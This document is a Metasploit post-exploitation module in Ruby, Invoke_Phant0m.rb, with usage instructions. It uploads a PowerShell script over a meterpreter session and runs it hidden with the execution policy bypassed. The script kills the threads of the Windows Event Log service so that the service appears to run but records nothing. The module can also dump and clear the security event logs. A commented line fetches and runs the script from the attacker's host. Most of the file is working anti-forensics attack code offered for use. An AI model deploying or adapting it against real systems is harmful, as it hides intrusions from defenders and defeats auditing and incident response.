##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


##
# [ Invoke_Phant0m.rb - disable logfiles creation ]
# Author: pedr0 Ubuntu [r00t-3xp10it]
# Invoke_Phant0m.ps1 Author: hlldz
# tested on: windows 10
# POC: https://www.youtube.com/watch?v=PF0-tZWCmpc
#
#
# [ POST-EXPLOITATION MODULE DESCRIPTION ]
# This post-exploitation module requires a meterpreter session open,
# to be able to upload and execute Invoke-Phant0m.ps1 powershell script
# Invoke-Phant0m.ps1 script walks thread stacks of Event Log Service process (spesific svchost.exe)
# and identify Event Log Threads to kill Event Log Service Threads. So the system will not be able
# to collect logs and at the same time the Event Log Service will appear to be running.
#
#
# [ MODULE OPTIONS ]
# The session number to run this module on      => set SESSION 1
# The full path of Invoke-Phant0m.ps1 to upload => set UPLOAD /tmp/Invoke-Phant0m.ps1
# The full remote path where to upload          => set REMOTE %temp%
# Display remote security event logs?           => set SHOW_EVENTS true
# Delete remote security event logs?            => set DEL_LOGS true
#
#
# [ PORT MODULE TO METASPLOIT DATABASE ]
# Kali linux   COPY TO: /usr/share/metasploit-framework/modules/post/windows/manage/Invoke_Phant0m.rb
# Ubuntu linux COPY TO: /opt/metasploit/apps/pro/msf3/modules/post/windows/manage/Invoke_Phant0m.rb
# Manually Path Search: root@kali:~# locate modules/post/windows/manage
#
#
# [ EXPLOITATION ]
# 1 - Exploit target to get session back (meterpreter)
# 2 - Download Invoke-Phant0m.ps1 script
#     https://github.com/r00t-3xp10it/Invoke-Phant0m
# 3 - copy Invoke-Phant0m.ps1 to /tmp/Invoke-Phant0m.ps1
# 4 - run post-module Invoke-Phant0m.rb
#
#
# [ LOAD/USE AUXILIARY ]
# meterpreter > background
# msf exploit(handler) > reload_all
# msf exploit(handler) > use post/windows/manage/Invoke_Phant0m
# msf post(Invoke-Phant0m) > info
# msf post(Invoke-Phant0m) > show options
# msf post(Invoke-Phant0m) > set [option(s)]
# msf post(Invoke-Phant0m) > exploit
#
#
# [ HINT ]
# In some linux distributions postgresql needs to be started and
# metasploit database deleted/rebuild to be abble to load module.
# 1 - service postgresql start
# 2 - msfdb reinit   (optional)
# 3 - msfconsole -q -x 'db_status; reload_all'
##





#
# Module Dependencies/requires
#
require 'rex'
require 'msf/core'
require 'msf/core/post/common'
require 'msf/core/post/windows/priv'



#
# Metasploit Class name and includes
#
class MetasploitModule < Msf::Post
      Rank = ExcellentRanking
 
         include Msf::Post::Common
         include Msf::Post::Windows::Priv



#
# Building Metasploit/Armitage info GUI/CLI
#
        def initialize(info={})
                super(update_info(info,
                        'Name'          => 'Invoke_Phantom [disable logfiles creation]',
                        'Description'   => %q{
                                        This script walks thread stacks of Event Log Service process (spesific svchost.exe) and identify Event Log Threads to kill Event Log Service Threads. So the system will not be able to collect logs and at the same time the Event Log Service will appear to be running..
                        },
                        'License'       => UNKNOWN_LICENSE,
                        'Author'        =>
                                [
                                        'Module Author: pedr0 Ubuntu [r00t-3xp10it]', # post-module author
                                        'Invoke_Phant0m.ps1: hlldz', # Invoke_Phant0m.ps1 author
                                        'Help debuging: Unique Guy', # debuging help
                                ],
 
                        'Version'        => '$Revision: 1.4',
                        'DisclosureDate' => 'jul 5 2017',
                        'Platform'       => 'windows',
                        'Arch'           => 'x86_x64',
                        'Privileged'     => 'true',  # its required a priviliged session to run some commands
                        'Targets'        =>
                                [
                                         # Tested againts windows 10 (64 bits)
                                         [ 'Windows XP', 'Windows VISTA', 'Windows 7', 'Windows 8', 'Windows 9', 'Windows 10' ]
                                ],
                        'DefaultTarget'  => '6', # default its to run againts windows 10 (64 bits)
                        'References'     =>
                                [
                                         [ 'URL', 'https://www.youtube.com/watch?v=PF0-tZWCmpc' ],
                                         [ 'URL', 'https://github.com/r00t-3xp10it/msf-auxiliarys' ],
                                         [ 'URL', 'https://github.com/r00t-3xp10it/Invoke-Phant0m' ]
                                ],
			'DefaultOptions' =>
				{
					'SESSION' => '1',  # Default its to run againts session 1
                                        'REMOTE'  => '%temp%', # remote full path of agent to be uploaded 
                                        'UPLOAD'  => '/tmp/Invoke-Phant0m.ps1', # local full path of agent to upload
                                        # TODO: use IEXdownload() method
                                        #'LHOST'   => 'RePlAcE'
				},
                        'SessionTypes'   => [ 'meterpreter' ]
 
                ))
 
                register_options(
                        [
                                OptString.new('SESSION', [ true, 'The session number to run this module on']),
                                OptString.new('UPLOAD', [ false, 'The full path of Invoke-Phant0m.ps1 to upload']),
                                OptString.new('REMOTE', [ false, 'The full remote path where to upload scipt'])
                        ], self.class)

                register_advanced_options(
                        [
                               # TODO: use IEXdownload() method
                               # OptString.new('LHOST', [ false, 'The server ip address to use (apache2)']),
                                OptBool.new('SHOW_EVENTS', [ false, 'Display remote security event logs?' , false]),
                                OptBool.new('DEL_LOGS', [ false, 'Delete remote security event logs?' , false])
                        ], self.class)
 
        end




#
# Stop EventViewer from recording activity ..
#
def ls_stage1

  r=''
  session = client
  remote = datastore['REMOTE']
  upload = datastore['UPLOAD']
  # TODO: use IEXdownload() method
  # local_host = datastore['LHOST']
  #
  # TODO: fix powershell file remote execution
  # powershell.exe -exec bypass; Import-Module #{remote}\\Invoke-Phant0m.ps1; Invoke-Phant0m
  # powershell.exe -wind hidden -ExecutionPolicy Bypass #{remote}\\Invoke-Phant0m.ps1
  # TODO: use IEXdownload() method
  # powershell.exe -exec bypass -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://#{local_host}/Invoke-Phant0m.ps1'))"
  #
  key = "powershell.exe -wind hidden -ExecutionPolicy Bypass #{remote}\\Invoke-Phant0m.ps1" # invoke-phantom script
  #
  # check for proper config settings enter ..
  # to prevent 'unset all' from deleting default options ..
  #
  if datastore['UPLOAD'] == 'nil' || datastore['REMOTE'] == 'nil'
    print_error("Options not configurated correctly ..")
    print_warning("Please set UPLOAD | REMOTE options ..")
    return nil
  else
    print_status("Stop EventViewer from recording activity ..")
    Rex::sleep(1.0)
    print_good("Remote upload path: #{remote} found ..")
    Rex::sleep(1.0)
  end

      #
      # TODO: if used IEXdownload() then this funtion its obsolect
      # upload our executable into target system ..
      #
      print_good("Uploading Invoke-Phant0m.ps1 agent ..")
      client.fs.file.upload("#{remote}\\Invoke-Phant0m.ps1","#{upload}")
      print_good("  Agent uploaded to: #{remote}\\Invoke-Phant0m.ps1")
      Rex::sleep(1.0)

        #
        # Executing remote powershell module (Invoke-Phant0m.ps1) ..
        #
        print_good("  Executing: Invoke-Phant0m.ps1 agent ..")
        r = session.sys.process.execute("cmd.exe /c #{key}", nil, {'Hidden' => true, 'Channelized' => true})
        Rex::sleep(1.0)
        #
        # TODO: if used IEXdownload() then displays results
        #
        # print_line("")
        # print_line(r)
        # print_line("")

    #
    # close channel when done
    #
    print_status("Invoke-Phant0m.ps1 executed ..")
    r.channel.close
    r.close

  #
  # error exception funtion
  #
  rescue ::Exception => e
  print_error("Error Running Command: #{e.class} #{e}")
end




#
# Display (gather) EventViewer security logs ..
#
def ls_stage2

  r=''
  dump_out=''
  session = client
  gather = "cscript eventquery.vbs /L security" # display security event logs
  #
  # check for proper config settings enter ..
  # to prevent 'unset all' from deleting default options ..
  #
  if datastore['SHOW_EVENTS'] == 'nil'
    print_error("Options not configurated correctly ..")
    print_warning("Please set SHOW_EVENTS options ..")
    return nil
  else
    print_status("Display EventViewer security logs")
    Rex::sleep(1.0)
  end

    #
    # Display 'security' event logs ..
    #
    print_line("---------------------------------")
    Rex::sleep(1.0)
    r = session.sys.process.execute("cmd.exe /c #{gather}", nil, {'Hidden' => true, 'Channelized' => true})
    dump_out = cmd_exec("cmd.exe /c #{gather}")
    print_line("")
    print_line(dump_out)
    print_line("")

    #
    # close channel when done
    #
    r.channel.close
    r.close

  #
  # error exception funtion
  #
  rescue ::Exception => e
  print_error("Error Running Command: #{e.class} #{e}")
end



#
# Delete EventViewer security logs ..
#
def ls_stage3

  r=''
  dump_out=''
  session = client
  clean_remove = "wevtutil.exe cl security" # delete security event logs
  #
  # check for proper config settings enter ..
  # to prevent 'unset all' from deleting default options ..
  #
  if datastore['DEL_LOGS'] == 'nil'
    print_error("Options not configurated correctly ..")
    print_warning("Please set DEL_LOGS options ..")
    return nil
  else
    print_status("Delete EventViewer security logs")
    Rex::sleep(1.0)
  end

    #
    # Delete 'security' event logs ..
    #
    print_line("--------------------------------")
    Rex::sleep(1.0)
    r = session.sys.process.execute("cmd.exe /c #{clean_remove}", nil, {'Hidden' => true, 'Channelized' => true})
    dump_out = cmd_exec("cmd.exe /c #{clean_remove}")
    print_line("")
    print_line(dump_out)
    print_line("")

    #
    # close channel when done
    #
    r.channel.close
    r.close

  #
  # error exception funtion
  #
  rescue ::Exception => e
  print_error("Error Running Command: #{e.class} #{e}")
end





#
# MAIN DISPLAY WINDOWS (ALL MODULES - def run)
# Running sellected modules against session target
#
def run
  session = client


      # Variable declarations (msf API calls)
      oscheck = client.fs.file.expand_path("%OS%")
      sysnfo = session.sys.config.sysinfo
      runtor = client.sys.config.getuid
      runsession = client.session_host
      directory = client.fs.dir.pwd


    # Print banner and scan results on screen
    print_line("")
    print_line("    +--------------------------------------------+")
    print_line("    | * INVOKE-PHANTOM (disable logs creation) * |")
    print_line("    |    Author: Pedro Ubuntu [ r00t-3xp10it ]   |")
    print_line("    |     Invoke_Phant0m.ps1 Author: hlldz       |")
    print_line("    +--------------------------------------------+")
    print_line("")
    print_line("    Running on session  : #{datastore['SESSION']}")
    print_line("    Target Architecture : #{sysnfo['Architecture']}")
    print_line("    Computer            : #{sysnfo['Computer']}")
    print_line("    Target IP addr      : #{runsession}")
    print_line("    Operative System    : #{sysnfo['OS']}")
    print_line("    Payload directory   : #{directory}")
    print_line("    Client UID          : #{runtor}")
    print_line("")
    print_line("")


    #
    # check for proper operating system (windows-not-wine)
    #
    if not oscheck == "Windows_NT"
      print_error("[ ABORT ]: This module only works againts windows systems")
      print_line("")
      return nil
    end
    #
    # check if we are running againts a priviliged session
    #
    if not runtor == "NT AUTHORITY\\SYSTEM"
      print_error("[ABORT]: This module requires a priviliged session ..")
      print_error("This module requires NT AUTHORITY\\SYSTEM privs to run ..")
      print_line("")
      return nil
    end
    #
    # check for proper session (meterpreter)
    #
    if not sysinfo.nil?
      print_status("Running module against: #{sysnfo['Computer']}")
    else
      print_error("[ABORT]:This post-module only works in meterpreter sessions")
      print_line("")
      return nil
    end
    # elevate session privileges befor runing options
    client.sys.config.getprivs.each do |priv|
    end


#
# Selected settings to run
#
      if datastore['REMOTE']
         ls_stage1
      end

      if datastore['SHOW_EVENTS']
         ls_stage2
      end

      if datastore['DEL_LOGS']
         ls_stage3
      end
   end
end
